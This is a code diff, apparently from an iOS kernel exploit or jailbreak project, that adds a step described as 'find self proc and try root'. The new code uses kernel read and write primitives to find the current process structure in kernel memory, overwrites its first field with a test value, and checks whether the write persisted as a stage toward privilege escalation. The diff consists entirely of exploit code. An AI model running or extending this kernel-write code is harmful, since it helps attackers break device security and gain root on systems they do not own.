@@ -732,9 +732,31 @@
                 testVal, rb, (rb == testVal) ? "VERIFIED" : "FAILED"];
             kwrite_zone_element_qword(chksumAddr, orig, pcb, 0x200);
 
-            // Step 2: report current state
+            // Step 2: find self proc and try root
+            extern uint64_t kp_get_self_proc(void);
+            uint64_t proc = kp_get_self_proc();
             [r appendFormat:@"  getuid() = %d\n", getuid()];
-            [r appendString:@"  (proc write test — next step)\n"];
+            if (proc) {
+                [r appendFormat:@"  self proc = 0x%016llx\n", proc];
+                // Read p_list.next to verify
+                uint64_t listNext = early_kread64(proc);
+                [r appendFormat:@"  p_list.next = 0x%016llx\n", listNext];
+                // Write test to proc+0x00
+                uint64_t procTest = 0xAAAABBBBCCCCDDDDULL;
+                krw_zone_verdict pv = kwrite_zone_element_qword(proc, procTest, proc, 0x400);
+                uint64_t procRB = early_kread64(proc);
+                [r appendFormat:@"  proc+0 write: verdict=%d  readback=0x%016llx\n", (int)pv, procRB];
+                if (procRB == procTest) {
+                    [r appendString:@"  >>> PROC WRITE VERIFIED! type 0x21 writable!\n"];
+                    kwrite_zone_element_qword(proc, listNext, proc, 0x400);
+                    [r appendString:@"  restored p_list.next\n"];
+                } else {
+                    [r appendString:@"  >>> proc write did not persist\n"];
+                    kwrite_zone_element_qword(proc, listNext, proc, 0x400);
+                }
+            } else {
+                [r appendString:@"  self proc not found (run full exploit first)\n"];
+            }
         }
         dispatch_async(dispatch_get_main_queue(), ^{
             [[KPLog shared] append:r];
